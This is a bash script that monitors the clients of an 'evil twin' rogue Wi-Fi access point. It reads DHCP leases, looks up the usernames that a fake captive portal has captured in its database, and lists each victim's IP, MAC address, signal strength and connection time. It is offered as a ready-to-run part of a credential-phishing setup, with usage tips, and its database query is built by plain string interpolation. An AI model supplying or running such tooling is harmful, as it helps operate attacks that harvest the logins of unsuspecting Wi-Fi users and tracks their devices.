#!/bin/bash
# Monitor Evil Twin Clients

DB="/var/www/secure/portal.db"
WIFI_IFACE="wlan0"
LEASES="/var/lib/misc/dnsmasq.leases"

echo "=== WiFi Captive Portal Monitor ==="
echo "Time: $(date)"
echo "------------------------------------------------------------"
printf "%-15s %-17s %-12s %-10s %-7s %-9s %-10s\n" "IP" "MAC" "User" "Status" "Signal" "Data_Used" "Conn_Time"
echo "------------------------------------------------------------"

# Go through dnsmasq leases
while read -r ts mac ip host clientid; do
    # username lookup
    user=$(sqlite3 $DB "SELECT username FROM sessions WHERE ip='$ip' AND active=1;")
    if [ -z "$user" ]; then
        user="(unknown)"
        status="IDLE"
    else
        status="ACTIVE"
    fi

    # signal strength from hostapd
    signal=$(sudo hostapd_cli -i $WIFI_IFACE all_sta 2>/dev/null | grep -A10 "$mac" | grep signal | awk '{print $2}')

    # basic conn time
    conn_time=$(( $(date +%s) - ts ))
    conn_time="${conn_time}s"

    printf "%-15s %-17s %-12s %-10s %-7s %-9s %-10s\n" "$ip" "$mac" "$user" "$status" "${signal:-?}" "0B" "$conn_time"
done < $LEASES

echo "------------------------------------------------------------"
echo "Tip: Run with: watch -n 5 ./monitor.sh"
